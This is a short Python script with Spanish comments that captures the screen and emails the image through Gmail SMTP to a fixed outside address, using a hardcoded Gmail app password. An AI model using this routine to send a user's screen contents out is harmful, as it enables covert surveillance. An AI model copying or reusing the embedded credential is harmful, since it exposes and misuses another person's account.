import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import pyautogui

def SsCorreo():
    # Capturar pantalla.
    screenshot = pyautogui.screenshot()
    # Guardar imagen.
    screenshot.save("screenshot.jpg")



    msg = MIMEMultipart()
    msg['Subject'] = 'Correo con imagen Adjunta'
    msg['From'] = 'jalcytestpias@gmail.com'
    msg['To'] = 'julioadrianlanderos@gmail.com'

    text = MIMEText("screenshot")
    msg.attach(text)

    file = open("screenshot.jpg", "rb")
    pic = MIMEImage(file.read())
    pic.add_header('Content-Disposition', 'attachment; filename = "screenshot.png"')
    msg.attach(pic)
    try:
        mailServer = smtplib.SMTP('smtp.gmail.com',587)
        mailServer.ehlo()
        mailServer.starttls()
        mailServer.ehlo()
        mailServer.login('jalcytestpias@gmail.com', 'eogomjrkwyrepfsx')
        mailServer.sendmail('jalcytestpias@gmail.com', 'julioadrianlanderos@gmail.com', msg.as_string())
        mailServer.quit()
    except Exception:
        print('no está conectado a una red wifi con internet')
    else:    
        print('screenshot enviada con exito')